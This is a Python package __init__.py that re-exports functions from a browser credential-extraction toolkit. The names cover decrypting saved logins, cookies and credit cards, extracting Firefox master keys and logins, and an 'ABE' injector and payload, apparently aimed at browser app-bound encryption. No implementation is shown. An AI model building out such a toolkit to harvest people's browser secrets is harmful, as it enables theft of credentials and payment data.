# core/__init__.py
from .cross_host import (
    MasterKeys,
    Vault,
    KeyDump,
    dump_keys,
    archive_profile,
    restore_from_archive,
    decrypt_value,
    decrypt_login_data,
    decrypt_cookies,
    extract_history,
    extract_bookmarks,
    decrypt_credit_cards,
    decrypt_firefox_logins,
    extract_firefox_master_key,
    find_browser_profiles,
    find_firefox_profiles,
    IS_WINDOWS,
    IS_LINUX,
    IS_WINE,
    ABEInjector,
)

from .abe_payload import get_abe_payload
from .abe_injector import ABEInjector as ABEInjectorImpl
from .asn1_pbe import (
    ASN1PBE,
    PrivateKeyPBE,
    PasswordCheckPBE,
    CredentialPBE,
)

__all__ = [
    # Cross-host functions
    "MasterKeys",
    "Vault",
    "KeyDump",
    "dump_keys",
    "archive_profile",
    "restore_from_archive",
    "decrypt_value",
    "decrypt_login_data",
    "decrypt_cookies",
    "extract_history",
    "extract_bookmarks",
    "decrypt_credit_cards",
    "decrypt_firefox_logins",
    "extract_firefox_master_key",
    "find_browser_profiles",
    "find_firefox_profiles",
    "IS_WINDOWS",
    "IS_LINUX",
    "IS_WINE",
    "ABEInjector",
    # ABE
    "get_abe_payload",
    "ABEInjectorImpl",
    # Firefox ASN1
    "ASN1PBE",
    "PrivateKeyPBE",
    "PasswordCheckPBE",
    "CredentialPBE",
]
